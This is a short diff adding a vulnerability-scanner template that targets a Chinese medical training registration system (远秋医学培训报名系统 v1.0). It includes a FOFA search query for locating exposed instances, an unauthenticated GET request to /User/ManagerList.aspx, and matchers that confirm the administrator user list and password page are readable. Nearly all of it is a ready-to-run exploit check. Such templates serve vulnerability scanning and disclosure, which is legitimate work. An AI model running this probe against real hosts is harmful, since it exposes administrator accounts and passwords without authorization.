@@ -1,0 +1,24 @@
+## id: VEID-2024-0205
+## name: 远秋医学培训系统未授权查看密码
+## author: hack007x
+## severity: medium
+## tags: veid,password,veid2024
+## description:接口存在未授权查看敏感信息。
+## fofa-query: title="远秋医学培训报名系统v1.0"
+## verification: true
+
+
+GET /User/ManagerList.aspx?ty=1&ty=1 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "用户名" && body contains "管理员设置"
+
+
+
+
+
+# @VEIL-STAMP: 3eb5f6ea7034c4676c2626202d188432abc626f4a6db324c66d5ea3049ae8004
